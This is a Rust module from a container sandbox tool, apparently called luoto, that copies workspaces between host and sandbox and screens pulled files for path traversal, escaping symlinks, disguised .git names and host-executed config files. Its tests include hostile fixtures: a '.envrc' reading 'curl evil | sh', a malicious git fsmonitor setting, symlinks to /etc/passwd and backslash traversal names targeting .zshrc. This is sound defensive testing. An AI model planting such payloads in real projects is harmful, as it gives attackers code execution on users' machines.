//! An env's workspace is a volume seeded from a host folder. This module resolves envs from
//! folders and moves files between host and sandbox without trusting what comes out.

use std::collections::BTreeMap;
use std::io::{Read, Write};
use std::path::{Component, Path, PathBuf};
use std::process::Stdio;

use anyhow::{Context, Result, bail};
use serde::Serialize;
use sha2::{Digest, Sha256};

use crate::config::{self, EnvFile};
use crate::env::{Ctx, UID};
use crate::names;
use crate::paths::Paths;

/// Heavy or machine-specific directories skipped when copying in either direction.
pub const SKIP_DIRS: &[&str] = &[
    "node_modules",
    "target",
    ".venv",
    "__pycache__",
    ".pytest_cache",
    ".next",
    ".svelte-kit",
    ".gradle",
];

/// Cap on a pull (it is buffered so it can be reviewed before anything is written).
const MAX_PULL_BYTES: u64 = 2 << 30;

pub fn expand(p: &str) -> PathBuf {
    match (p.strip_prefix("~/"), directories::BaseDirs::new()) {
        (Some(rest), Some(b)) => b.home_dir().join(rest),
        _ => PathBuf::from(p),
    }
}

pub fn canonical(p: &str) -> Result<PathBuf> {
    let path = expand(p);
    path.canonicalize()
        .with_context(|| format!("{} does not exist", path.display()))
}

/// A valid env name from a directory or repo name: `My_Project` → `my-project`.
pub fn name_from(s: &str) -> String {
    let base = s
        .trim_end_matches(['/', '\\'])
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(s)
        .trim_end_matches(".git");
    let mut out = String::new();
    for c in base.chars() {
        let c = c.to_ascii_lowercase();
        if c.is_ascii_alphanumeric() {
            out.push(c);
        } else if !out.ends_with('-') && !out.is_empty() {
            out.push('-');
        }
    }
    let out: String = out.trim_matches('-').chars().take(40).collect();
    out.trim_end_matches('-').to_string()
}

/// The env whose directory contains `cwd` (the deepest one).
pub fn env_for_dir(paths: &Paths, cwd: &Path) -> Result<Option<String>> {
    let mut best: Option<(usize, String)> = None;
    for name in config::list_envs(paths)? {
        let Ok(f) = EnvFile::load(paths, &name) else {
            continue;
        };
        let Some(dir) = f.cfg.workspace.dir.as_deref() else {
            continue;
        };
        let Ok(dir) = canonical(dir) else { continue };
        if cwd.starts_with(&dir) {
            let depth = dir.components().count();
            if best.as_ref().is_none_or(|(d, _)| depth > *d) {
                best = Some((depth, name));
            }
        }
    }
    Ok(best.map(|(_, n)| n))
}

/// Resolve an env argument: a name, or `.`/nothing for the env of the current directory.
pub fn resolve(paths: &Paths, arg: Option<&str>) -> Result<String> {
    match arg {
        Some(n) if n != "." => {
            config::validate_name(n)?;
            Ok(n.to_string())
        }
        _ => {
            let cwd = std::env::current_dir()?.canonicalize()?;
            env_for_dir(paths, &cwd)?.with_context(|| {
                format!(
                    "no env for {} — name one, or create it here with `luoto init`",
                    cwd.display()
                )
            })
        }
    }
}

/// A path component as macOS (APFS/HFS+) and Windows (NTFS) compare it: case-folded, with
/// the invisible characters HFS+ ignores removed and the trailing dots and spaces NTFS drops.
/// `.GIT`, `.g\u{200c}it` and `.git.` all name `.git` there. Folding goes through upper case
/// first, as the filesystems' tables do: `ſ` (long s) names `s`, `ı` names `i`.
pub fn fold(component: &str) -> String {
    let s: String = component
        .chars()
        .filter(|c| !crate::text::is_format(*c))
        .flat_map(char::to_uppercase)
        .flat_map(char::to_lowercase)
        .collect();
    s.trim_end_matches(['.', ' ']).to_string()
}

/// An NTFS 8.3 short name (`VSCODE~1`, `ENVRC~2`), which can stand for any long name.
fn short_name(folded: &str) -> bool {
    let stem = folded.split('.').next().unwrap_or("");
    stem.rsplit_once('~').is_some_and(|(head, n)| {
        !head.is_empty() && !n.is_empty() && n.bytes().all(|b| b.is_ascii_digit())
    })
}

/// `rel` with every component folded (see [`fold`]).
fn fold_path(rel: &str) -> String {
    rel.trim_start_matches("./")
        .split('/')
        .map(fold)
        .collect::<Vec<_>>()
        .join("/")
}

/// Whether a component is git's metadata directory under another spelling, including the
/// NTFS 8.3 short name `GIT~1`.
fn disguised_git(component: &str) -> bool {
    let f = fold(component);
    component != ".git" && (f == ".git" || f.starts_with("git~"))
}

/// Paths host tools act on by themselves (opening the folder, entering it, running git, or a
/// build tool's wrapper and config). A sandbox that can write these can run code on the host.
/// Compared folded, so case or invisible characters don't hide them.
pub fn risky(rel: &str) -> Option<&'static str> {
    let rel = fold_path(rel);
    let mut parts = rel.split('/');
    let first = parts.next().unwrap_or("");
    let second = parts.next().unwrap_or("");
    let file = rel.rsplit('/').next().unwrap_or(&rel);
    if first == ".git" || first.starts_with("git~") {
        return Some("git metadata (hooks and config run on the host)");
    }
    if rel.split('/').any(short_name) {
        return Some("a Windows short name, which can stand for a file host tools act on");
    }
    match rel.as_str() {
        ".envrc" | ".env.local" => return Some("direnv/dotenv loads it when you enter the folder"),
        ".gitattributes" | ".gitmodules" => return Some("git filters and submodule URLs"),
        ".mise.toml" | "mise.toml" | ".tool-versions" | ".mise.local.toml" | "mise.local.toml"
        | ".config/mise.toml" | "mise/config.toml" => {
            return Some("mise runs hooks and tasks from it");
        }
        ".pre-commit-config.yaml"
        | "lefthook.yml"
        | ".lefthook.yml"
        | "lefthook.yaml"
        | ".lefthook.yaml" => {
            return Some("git hook manager config");
        }
        ".yarnrc.yml" | ".yarnrc" | ".npmrc" | ".pnpmfile.cjs" => {
            return Some("the package manager runs code it names (yarnPath, hooks, scripts)");
        }
        ".cargo/config.toml" | ".cargo/config" => return Some("cargo runners and aliases"),
        "rust-toolchain.toml" | "rust-toolchain" => return Some("rustup toolchain path"),
        "gradlew" | "gradlew.bat" | "mvnw" | "mvnw.cmd" => {
            return Some("build wrapper your IDE runs on import");
        }
        _ => {}
    }
    match (first, second) {
        (".config", "mise") | (".mise", _) => return Some("mise runs hooks and tasks from it"),
        ("gradle", "wrapper") | (".mvn", _) => {
            return Some("build wrapper and extensions your IDE runs on import");
        }
        _ => {}
    }
    match first {
        ".vscode" => Some("VS Code runs tasks and reads settings from it"),
        ".idea" => Some("JetBrains IDE run configurations"),
        ".husky" => Some("git hooks"),
        ".devcontainer" => Some("dev container definition run by your IDE"),
        ".zed" => Some("Zed tasks and settings"),
        ".claude" | ".cursor" => Some("coding-agent hooks and settings that run on the host"),
        _ if file.ends_with(".code-workspace") => Some("VS Code workspace (tasks, settings)"),
        _ => None,
    }
}

// ---------- push / pull ----------

fn skip(rel: &Path, include_git: bool) -> bool {
    rel.components().any(|c| {
        let s = c.as_os_str().to_string_lossy();
        SKIP_DIRS.contains(&s.as_ref()) || (!include_git && s == ".git")
    })
}

/// Copy a host directory into the env's workspace (host → sandbox is the trusted direction).
pub fn push(ctx: &Ctx, env: &str, src: &Path) -> Result<usize> {
    let mut child = ctx
        .rt
        .command()
        .args([
            "exec",
            "-i",
            "-u",
            UID,
            &names::dev(env),
            "tar",
            "-x",
            "-f",
            "-",
            "-C",
            "/workspace",
        ])
        .stdin(Stdio::piped())
        .stdout(Stdio::null())
        .stderr(Stdio::piped())
        .spawn()
        .context("start tar in the env")?;
    let stdin = child.stdin.take().context("stdin")?;
    let mut builder = tar::Builder::new(stdin);
    builder.follow_symlinks(false);
    let mut count = 0;
    let mut stack = vec![src.to_path_buf()];
    while let Some(dir) = stack.pop() {
        for entry in std::fs::read_dir(&dir).with_context(|| format!("read {}", dir.display()))? {
            let entry = entry?;
            let path = entry.path();
            let rel = path.strip_prefix(src)?.to_path_buf();
            if skip(&rel, true) {
                continue;
            }
            let ft = entry.file_type()?;
            if ft.is_dir() {
                builder.append_dir(&rel, &path)?;
                stack.push(path);
            } else if ft.is_file() || ft.is_symlink() {
                builder.append_path_with_name(&path, &rel)?;
                count += 1;
            }
        }
    }
    builder.into_inner()?.flush()?;
    let out = child.wait_with_output()?;
    if !out.status.success() {
        bail!(
            "copying into the env failed: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        );
    }
    Ok(count)
}

#[derive(Debug, Clone, Serialize)]
pub struct PlanEntry {
    pub path: String,
    /// `new` or `changed`.
    pub change: String,
    pub size: u64,
    pub executable: bool,
    pub risky: Option<String>,
}

#[derive(Debug, Clone, Serialize)]
pub struct PullPlan {
    pub dir: String,
    pub entries: Vec<PlanEntry>,
    pub unchanged: usize,
    /// Entries refused outright (unsafe paths, links leaving the folder, special files).
    pub refused: Vec<(String, String)>,
    /// Hash over what would be written; applying re-checks it so a sandbox can't swap files
    /// between your review and the write.
    pub digest: String,
    #[serde(skip)]
    data: BTreeMap<String, Content>,
}

#[derive(Debug, Clone)]
enum Content {
    File { bytes: Vec<u8>, executable: bool },
    Link(PathBuf),
}

/// A relative path made only of normal components.
fn safe_rel(p: &Path) -> Option<PathBuf> {
    let mut out = PathBuf::new();
    for c in p.components() {
        match c {
            // A backslash is a separator on Windows and becomes `/` in the plan; a colon is a
            // drive or a data stream there. Neither is one plain name.
            Component::Normal(n)
                if n.to_str()
                    .is_some_and(|s| !s.contains('\\') && !(cfg!(windows) && s.contains(':'))) =>
            {
                out.push(n)
            }
            Component::CurDir => {}
            _ => return None,
        }
    }
    (!out.as_os_str().is_empty()).then_some(out)
}

/// Does a link at `rel` pointing to `target` stay inside the folder?
fn link_stays_inside(rel: &Path, target: &Path) -> bool {
    if target.is_absolute() || target.to_string_lossy().contains('\\') {
        return false;
    }
    let mut depth: i64 = rel.components().count() as i64 - 1;
    for c in target.components() {
        match c {
            Component::ParentDir => depth -= 1,
            Component::Normal(_) => depth += 1,
            Component::CurDir => {}
            _ => return false,
        }
        if depth < 0 {
            return false;
        }
    }
    true
}

pub fn plan_pull(ctx: &Ctx, env: &str, dest: &Path, include_git: bool) -> Result<PullPlan> {
    let mut args = vec![
        "exec".to_string(),
        "-u".into(),
        UID.into(),
        names::dev(env),
        "tar".into(),
        "-c".into(),
        "-f".into(),
        "-".into(),
    ];
    for d in SKIP_DIRS {
        args.push(format!("--exclude={d}"));
    }
    if !include_git {
        args.push("--exclude=.git".into());
    }
    args.extend(["-C".into(), "/workspace".into(), ".".into()]);
    let mut child = ctx
        .rt
        .command()
        .args(&args)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .context("start tar in the env")?;
    let mut raw = Vec::new();
    child
        .stdout
        .take()
        .context("stdout")?
        .take(MAX_PULL_BYTES + 1)
        .read_to_end(&mut raw)?;
    let out = child.wait_with_output()?;
    if raw.len() as u64 > MAX_PULL_BYTES {
        bail!("the workspace is larger than 2 GiB; pull a narrower set or push to a git remote");
    }
    if !out.status.success() && raw.is_empty() {
        bail!(
            "reading the env's workspace failed: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        );
    }
    build_plan(&raw, dest)
}

fn build_plan(raw: &[u8], dest: &Path) -> Result<PullPlan> {
    let mut archive = tar::Archive::new(raw);
    let mut entries = Vec::new();
    let mut refused = Vec::new();
    let mut data = BTreeMap::new();
    let mut unchanged = 0;
    let mut hasher = Sha256::new();
    // Folded paths already in the plan: on a case-insensitive host two of them are one file.
    let mut seen = std::collections::HashSet::new();
    for e in archive.entries()? {
        let mut e = e?;
        let raw_path = e.path()?.to_path_buf();
        let shown = raw_path
            .to_string_lossy()
            .trim_start_matches("./")
            .to_string();
        let kind = e.header().entry_type();
        if kind.is_dir() {
            continue;
        }
        let Some(rel) = safe_rel(&raw_path) else {
            refused.push((shown, "unsafe path".into()));
            continue;
        };
        let rel_s = rel.to_string_lossy().replace('\\', "/");
        if rel_s.split('/').any(disguised_git) {
            refused.push((rel_s, "names .git under another spelling".into()));
            continue;
        }
        if !seen.insert(fold_path(&rel_s)) {
            refused.push((
                rel_s,
                "differs from another file only by case or invisible characters".into(),
            ));
            continue;
        }
        let host = dest.join(&rel);
        let content = if kind.is_file() {
            let mut bytes = Vec::new();
            e.read_to_end(&mut bytes)?;
            let executable = e.header().mode().unwrap_or(0) & 0o111 != 0;
            Content::File { bytes, executable }
        } else if kind.is_symlink() {
            let Some(target) = e.link_name()?.map(|t| t.to_path_buf()) else {
                continue;
            };
            if !link_stays_inside(&rel, &target) {
                refused.push((
                    rel_s,
                    format!("symlink to {} leaves the folder", target.display()),
                ));
                continue;
            }
            Content::Link(target)
        } else {
            refused.push((rel_s, "special file".into()));
            continue;
        };
        let (change, size, executable) = match &content {
            Content::File { bytes, executable } => {
                let same = std::fs::symlink_metadata(&host).is_ok_and(|m| m.is_file())
                    && std::fs::read(&host).is_ok_and(|h| &h == bytes);
                (
                    if same {
                        None
                    } else if host.exists() {
                        Some("changed")
                    } else {
                        Some("new")
                    },
                    bytes.len() as u64,
                    *executable,
                )
            }
            Content::Link(t) => {
                let same = std::fs::read_link(&host).is_ok_and(|h| &h == t);
                (
                    if same {
                        None
                    } else if host.symlink_metadata().is_ok() {
                        Some("changed")
                    } else {
                        Some("new")
                    },
                    0,
                    false,
                )
            }
        };
        let Some(change) = change else {
            unchanged += 1;
            continue;
        };
        hasher.update(rel_s.as_bytes());
        match &content {
            Content::File { bytes, executable } => {
                hasher.update(Sha256::digest(bytes));
                hasher.update([u8::from(*executable)]);
            }
            Content::Link(t) => hasher.update(t.to_string_lossy().as_bytes()),
        }
        let newly_exec = executable && !std::fs::metadata(&host).is_ok_and(|m| is_executable(&m));
        let risky = risky(&rel_s)
            .map(str::to_string)
            .or_else(|| newly_exec.then(|| "becomes executable".to_string()))
            .or_else(|| matches!(content, Content::Link(_)).then(|| "symlink".to_string()));
        entries.push(PlanEntry {
            path: rel_s.clone(),
            change: change.into(),
            size,
            executable,
            risky,
        });
        data.insert(rel_s, content);
    }
    Ok(PullPlan {
        dir: dest.display().to_string(),
        entries,
        unchanged,
        refused,
        digest: hex::encode(&hasher.finalize()[..16]),
        data,
    })
}

#[cfg(unix)]
fn is_executable(m: &std::fs::Metadata) -> bool {
    use std::os::unix::fs::PermissionsExt;
    m.permissions().mode() & 0o111 != 0
}

#[cfg(not(unix))]
fn is_executable(_m: &std::fs::Metadata) -> bool {
    false
}

/// Write a reviewed plan. Risky entries are skipped unless `include_risky`.
pub fn apply_pull(plan: &PullPlan, include_risky: bool) -> Result<(usize, usize)> {
    let dest = PathBuf::from(&plan.dir);
    let mut written = 0;
    let mut skipped = 0;
    for e in &plan.entries {
        if e.risky.is_some() && !include_risky {
            skipped += 1;
            continue;
        }
        let Some(content) = plan.data.get(&e.path) else {
            continue;
        };
        let target = dest.join(&e.path);
        ensure_parents_inside(&dest, &target)?;
        match content {
            Content::File { bytes, executable } => {
                let tmp = target.with_extension("luoto-tmp");
                if std::fs::symlink_metadata(&tmp).is_ok() {
                    std::fs::remove_file(&tmp)?;
                }
                // create_new: never write through something already at the temp path.
                std::fs::OpenOptions::new()
                    .write(true)
                    .create_new(true)
                    .open(&tmp)
                    .and_then(|mut f| std::io::Write::write_all(&mut f, bytes))
                    .with_context(|| format!("write {}", target.display()))?;
                #[cfg(unix)]
                {
                    use std::os::unix::fs::PermissionsExt;
                    let mode = if *executable { 0o755 } else { 0o644 };
                    std::fs::set_permissions(&tmp, std::fs::Permissions::from_mode(mode))?;
                }
                #[cfg(not(unix))]
                let _ = executable;
                if std::fs::symlink_metadata(&target).is_ok_and(|m| m.file_type().is_symlink()) {
                    std::fs::remove_file(&target)?;
                }
                std::fs::rename(&tmp, &target)?;
            }
            Content::Link(t) => {
                if std::fs::symlink_metadata(&target).is_ok() {
                    std::fs::remove_file(&target)?;
                }
                #[cfg(unix)]
                std::os::unix::fs::symlink(t, &target)?;
                #[cfg(not(unix))]
                {
                    let _ = t;
                    skipped += 1;
                    continue;
                }
            }
        }
        written += 1;
    }
    Ok((written, skipped))
}

/// Create the parents of `target` inside `root`, refusing to walk through a symlink (which
/// could point anywhere on the host).
fn ensure_parents_inside(root: &Path, target: &Path) -> Result<()> {
    let parent = target.parent().context("no parent")?;
    let rel = parent
        .strip_prefix(root)
        .context("path outside the folder")?;
    let mut cur = root.to_path_buf();
    for c in rel.components() {
        let Component::Normal(_) = c else {
            bail!("{} leaves the folder", target.display());
        };
        cur.push(c);
        match std::fs::symlink_metadata(&cur) {
            Ok(m) if m.file_type().is_symlink() => {
                bail!(
                    "{} is a symlink on the host; refusing to write through it",
                    cur.display()
                )
            }
            Ok(m) if m.is_dir() => {}
            Ok(_) => bail!("{} exists and is not a directory", cur.display()),
            Err(_) => std::fs::create_dir(&cur)?,
        }
    }
    Ok(())
}

/// Write `n` lines describing a plan.
pub fn describe(plan: &PullPlan, w: &mut impl Write) -> std::io::Result<()> {
    let risky: Vec<&PlanEntry> = plan.entries.iter().filter(|e| e.risky.is_some()).collect();
    writeln!(
        w,
        "{} new or changed file(s), {} unchanged → {}",
        plan.entries.len(),
        plan.unchanged,
        plan.dir
    )?;
    for e in plan.entries.iter().filter(|e| e.risky.is_none()).take(30) {
        writeln!(w, "  {:<7} {}", e.change, crate::text::display(&e.path))?;
    }
    if plan.entries.len() - risky.len() > 30 {
        writeln!(w, "  … and {} more", plan.entries.len() - risky.len() - 30)?;
    }
    if !risky.is_empty() {
        writeln!(w, "risky (skipped unless --include-risky):")?;
        for e in &risky {
            writeln!(
                w,
                "  {:<7} {} — {}",
                e.change,
                crate::text::display(&e.path),
                e.risky.as_deref().unwrap_or("")
            )?;
        }
    }
    for (p, why) in &plan.refused {
        writeln!(
            w,
            "refused  {} — {}",
            crate::text::display(p),
            crate::text::display(why)
        )?;
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tar_of(files: &[(&str, &[u8])]) -> Vec<u8> {
        let mut b = tar::Builder::new(Vec::new());
        for (path, data) in files {
            let mut h = tar::Header::new_gnu();
            h.set_size(data.len() as u64);
            h.set_mode(0o644);
            h.set_cksum();
            b.append_data(&mut h, path, *data).unwrap();
        }
        b.into_inner().unwrap()
    }

    #[test]
    fn pull_refuses_disguised_git_and_case_collisions() {
        let dir = tempfile::tempdir().unwrap();
        let raw = tar_of(&[
            (".GIT/config", b"[core]\n\tfsmonitor = evil\n"),
            (".g\u{200c}it/HEAD", b"x"),
            ("GIT~1/config", b"x"),
            ("README.md", b"a"),
            ("readme.MD", b"b"),
            (".VSCODE/tasks.json", b"{}"),
        ]);
        let plan = build_plan(&raw, dir.path()).unwrap();
        let refused: Vec<&str> = plan.refused.iter().map(|(p, _)| p.as_str()).collect();
        assert!(refused.contains(&".GIT/config"));
        assert!(refused.contains(&".g\u{200c}it/HEAD"));
        assert!(refused.contains(&"GIT~1/config"));
        assert!(refused.contains(&"readme.MD"));
        let vscode = plan
            .entries
            .iter()
            .find(|e| e.path == ".VSCODE/tasks.json")
            .unwrap();
        assert!(vscode.risky.is_some());
    }

    #[test]
    fn risky_covers_build_tool_configs() {
        for p in [
            ".config/mise/config.toml",
            ".yarnrc.yml",
            ".cargo/config.toml",
            "gradle/wrapper/gradle-wrapper.properties",
            ".mvn/extensions.xml",
            ".claude/settings.json",
            ".Envrc",
        ] {
            assert!(risky(p).is_some(), "{p}");
        }
        assert!(risky("src/main.rs").is_none());
    }

    fn tarball(entries: &[(&str, &[u8], u32)], links: &[(&str, &str)]) -> Vec<u8> {
        let mut b = tar::Builder::new(Vec::new());
        for (p, data, mode) in entries {
            let mut h = tar::Header::new_gnu();
            h.set_size(data.len() as u64);
            h.set_mode(*mode);
            h.set_entry_type(tar::EntryType::Regular);
            h.set_cksum();
            b.append_data(&mut h, p, *data).unwrap();
        }
        for (p, target) in links {
            let mut h = tar::Header::new_gnu();
            h.set_entry_type(tar::EntryType::Symlink);
            h.set_size(0);
            b.append_link(&mut h, p, target).unwrap();
        }
        b.into_inner().unwrap()
    }

    #[test]
    fn names_from_dirs() {
        assert_eq!(name_from("/Users/x/dev/My_Project"), "my-project");
        assert_eq!(name_from("eetu/luoto.git"), "luoto");
        assert_eq!(name_from("/tmp/x/"), "x");
    }

    #[test]
    fn plan_flags_risky_and_refuses_escapes() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("same.txt"), b"same").unwrap();
        let raw = tarball(
            &[
                ("./src/main.rs", b"fn main() {}", 0o644),
                ("./same.txt", b"same", 0o644),
                ("./.envrc", b"curl evil | sh", 0o644),
                ("./.vscode/tasks.json", b"{}", 0o644),
                ("./run.sh", b"#!/bin/sh", 0o755),
            ],
            &[
                ("./ok-link", "src/main.rs"),
                ("./bad-link", "../../etc/passwd"),
                ("./abs", "/etc/passwd"),
            ],
        );
        let plan = build_plan(&raw, dir.path()).unwrap();
        assert_eq!(plan.unchanged, 1);
        let get = |p: &str| plan.entries.iter().find(|e| e.path == p);
        assert!(get("src/main.rs").unwrap().risky.is_none());
        assert!(get(".envrc").unwrap().risky.is_some());
        assert!(get(".vscode/tasks.json").unwrap().risky.is_some());
        assert_eq!(
            get("run.sh").unwrap().risky.as_deref(),
            Some("becomes executable")
        );
        assert!(get("ok-link").is_some());
        assert_eq!(plan.refused.len(), 2);

        let (written, skipped) = apply_pull(&plan, false).unwrap();
        assert_eq!((written, skipped), (1, 4));
        assert!(dir.path().join("src/main.rs").exists());
        assert!(!dir.path().join(".envrc").exists());
    }

    #[cfg(unix)]
    #[test]
    fn a_backslash_name_is_refused_not_turned_into_a_path() {
        let root = tempfile::tempdir().unwrap();
        let dir = root.path().join("a/b/project");
        std::fs::create_dir_all(&dir).unwrap();
        let raw = tarball(
            &[
                ("./x\\..\\..\\..\\.zshrc", b"evil", 0o644),
                ("./x\\..\\.git\\config", b"evil", 0o644),
            ],
            &[("./l", "..\\..\\.zshrc")],
        );
        let plan = build_plan(&raw, &dir).unwrap();
        assert!(plan.entries.is_empty(), "{:?}", plan.entries);
        assert_eq!(plan.refused.len(), 3);
        apply_pull(&plan, true).unwrap();
        assert!(!root.path().join("a/.zshrc").exists());
        assert!(!dir.join(".git").exists());
    }

    #[test]
    fn risky_names_are_folded_as_the_filesystem_folds_them() {
        assert!(
            risky(".v\u{17f}code/tasks.json").is_some(),
            "long s is s on APFS"
        );
        assert!(risky("mi\u{17f}e.toml").is_some());
        assert!(risky("VSCODE~1/tasks.json").is_some(), "an 8.3 short name");
        assert!(risky("src/notes~draft.md").is_none());
    }

    #[cfg(unix)]
    #[test]
    fn refuses_writing_through_host_symlinks() {
        let dir = tempfile::tempdir().unwrap();
        let outside = tempfile::tempdir().unwrap();
        std::os::unix::fs::symlink(outside.path(), dir.path().join("src")).unwrap();
        let raw = tarball(&[("./src/x.rs", b"x", 0o644)], &[]);
        let plan = build_plan(&raw, dir.path()).unwrap();
        assert!(apply_pull(&plan, false).is_err());
        assert!(!outside.path().join("x.rs").exists());
    }
}
